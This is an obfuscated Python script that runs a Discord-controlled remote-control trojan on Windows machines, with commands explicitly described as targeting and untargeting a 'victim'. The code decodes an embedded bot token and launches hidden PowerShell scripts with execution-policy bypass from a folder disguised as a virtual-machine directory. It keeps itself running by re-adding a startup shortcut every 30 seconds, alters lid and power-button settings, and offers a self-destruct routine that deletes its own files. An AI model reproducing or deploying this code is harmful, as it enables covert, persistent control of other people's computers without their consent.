j='all'
i='-SoundName'
h='.WAV'
g='win'
Y='%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\reinstate.ps1'
T='Reinstated parameter successfully.'
S='\\'
R='%USERPROFILE%'
Q='-File'
P='Hidden'
O='-WindowStyle'
N='Bypass'
M='-ExecutionPolicy'
L='powershell.exe'
K=None
G=Exception
E=True
A=print
from discord.ext import commands as k
import subprocess as C,traceback as l,tempfile,threading as Z,asyncio as H,discord as U,aiohttp as m,shutil,base64 as n,time as V,sys as W,os as B
a=U.Intents.default()
a.message_content=E
D=k.Bot(command_prefix='!',intents=a)
X='TVRFM056ZzNOalkwTnpRMU5EY3lNREEwTVEuR050T1pSLjRYclZMMzRmdmx2VW04WXk1ZXNNZXFTek9YZThyZFQxZXFVSEpj'
X=n.b64decode(X).decode()
F=E
I=K
J=134217728
b='V6.1'
@D.event
async def v():
	A(f"{D.user.name} has connected to Discord!");A('Registered commands:')
	for B in D.commands:A(B.name)
@D.command(name='start',help='Play big sound')
async def w(ctx,sound_name=g):
	R=sound_name;global F
	if not F:return
	await ctx.send(f"Receive start command");R=R+h;A('Received start command');c();V.sleep(2);D=H.get_running_loop()
	def S():
		global I;H=B.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\ubuntu24.ps1')
		try:
			I=C.Popen([L,M,N,O,P,Q,H,i,R],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);S,D=I.communicate(timeout=10)
			if D:
				with open(B.path.expandvars('%TEMP%\\ps1_error_log.txt'),'w')as K:K.write(D)
				A(f"[ERROR] {D}");return f"Error occurred:\n{D}"
			return'No error'
		except G as F:A(f"[Exception] {F}");return f"Exception while launching: {F}"
	T=await D.run_in_executor(K,S);await ctx.send(T)
@D.command(name='stop',help='Stop big sound')
async def x(ctx):
	global I
	if I and I.poll()is K:I.terminate();I.wait();await ctx.send('Process has been stopped.')
	else:await ctx.send('No process is currently running.')
@D.command(name='info',help='Know who is running')
async def y(ctx):global F;A('Received info command');D=B.path.expandvars(R);C=D.split(S)[-1];await ctx.send(f"{C} running {b}"if F else f"{C} not running {b}")
@D.command(name='sound',help='Play small sound')
async def z(ctx,sound_name=g):
	D=sound_name;global F
	if not F:return
	await ctx.send(f"Received sound command");D=D+h;c();V.sleep(2);A('Received sound command');I=H.get_running_loop()
	def R():
		H=B.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\ubuntu25.ps1')
		try:C.Popen([L,M,N,O,P,Q,H,i,D],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return'Launched successfully.'
		except G as F:A(f"[Exception] {F}");return f"Exception while launching: {F}"
	S=await I.run_in_executor(K,R);await ctx.send(S)
@D.command(name='deactivate',help='Untarget a victim')
async def A0(ctx,name):
	G=False;D=ctx;C=name;global F;A('Received deactivate command for',C);H=B.path.expandvars(R);E=H.split(S)[-1]
	if C==E:await D.send(f"Deactivated {E}");F=G
	elif C==j:await D.send(f"Deactivated for all");F=G
	else:await D.send(f"No name found for {C}")
@D.command(name='activate',help='Target a victim')
async def A1(ctx,name):
	D=ctx;C=name;global F;A('Received continue command for',C);H=B.path.expandvars(R);G=H.split(S)[-1]
	if C==G:await D.send(f"Reactivated {G}");F=E
	elif C==j:await D.send(f"Reactivated for all");F=E
	else:await D.send(f"No name found for {C}")
@D.command(name='quit',help='Stop script')
async def quit(ctx,name):
	C=name;E=B.path.expandvars(R);D=E.split(S)[-1];A(C,D)
	if C==D:await ctx.send(f"Quitting {C}");W.exit(0)
	else:await ctx.send(f"Did not find name for {C}")
async def o(error_msg):
	B=D.get_channel(DISCORD_CHANNEL_ID)
	if B:await B.send(f"❌ Self-delete failed:\n```\n{error_msg}\n```")
	else:A("Couldn't find Discord channel to send error.")
def p():
	try:
		H=B.path.abspath(W.argv[0]);A=B.path.dirname(H);I=B.path.dirname(A);F=B.path.join(I,'delete_folder.bat')
		with open(F,'w')as J:J.write(f'''@echo off
:loop
tasklist | findstr /I /C:"{B.path.basename(W.executable)}" >nul
if not errorlevel 1 (
    timeout /T 1 >nul
    goto loop
)
rmdir /S /Q "{A}"
del "%~f0"
''')
		C.Popen([F],shell=E)
	except G as L:K=l.format_exc();D.loop.create_task(o(K))
def q():
	D=H.get_running_loop()
	def F():
		F=B.path.expandvars(Y)
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return T
		except G as D:A(f"[Exception] {D}");return f"Exception while reinstating: {D}"
	D.run_in_executor(K,F)
def c():
	D=H.get_running_loop()
	def F():
		F=B.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\resound.ps1')
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return T
		except G as D:A(f"[Exception] {D}");return f"Exception while reinstating: {D}"
	D.run_in_executor(K,F)
@D.command(name='reinstate',help='Lid / powerbutton to default')
async def A2(ctx,name):
	D=B.path.expandvars(R);F=D.split(S)[-1]
	if not name==F:return
	I=H.get_running_loop()
	def U():
		F=B.path.expandvars(Y)
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return T
		except G as D:A(f"[Exception] {D}");return f"Exception while reinstating: {D}"
	V=await I.run_in_executor(K,U);await ctx.send(V)
def r():
	F=B.path.expandvars(Y)
	try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return T
	except G as D:A(f"[Exception] {D}");return f"Exception while reinstating: {D}"
def d():
	def D():
		F=B.path.expandvars('%USERPROFILE%\\Documents\\Virtual Machines\\Ubuntu24\\shortcutmaker.ps1')
		try:C.Popen([L,M,N,O,P,Q,F],stdout=C.PIPE,stderr=C.PIPE,creationflags=J,text=E);return T
		except G as D:A(f"[Exception] {D}");return f"Exception while reinstating: {D}"
	D();A('Created shortcut')
def s():
	C='StartupSystem';E=B.path.join(B.getenv('APPDATA'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup');D=B.path.join(E,C+'.lnk')
	if B.path.exists(D):B.remove(D);A(f"Shortcut '{C}.lnk' deleted from Startup.")
	else:A(f"Shortcut '{C}.lnk' not found in Startup.")
@D.command(name='selfdestruct',help='Delete the script from the machine')
async def A3(ctx,name):
	A=ctx;C=B.path.expandvars(R);E=C.split(S)[-1]
	if not name==E:return
	s();await A.send('Shortcut deleted successfully');q();await A.send('Reinstated successfully');await A.send('🧨 Self-destruct sequence initiated...');V.sleep(2);p();await A.send('💥 If all goes well, I will now disappear...');await D.close()
def t():
	while E:d();V.sleep(30)
def u():
	async def B():
		while E:
			try:await D.start(X)
			except(U.ConnectionClosed,U.GatewayNotFound,U.HTTPException,m.ClientConnectorError)as B:A(f"[ERROR] Discord bot connection error: {B}");await H.sleep(10)
			except G as B:A(f"[Bot Error] Unexpected error: {B}");await H.sleep(10)
	H.run(B())
d()
r()
A('Running')
e=Z.Thread(target=t)
f=Z.Thread(target=u)
e.start()
f.start()
e.join()
f.join()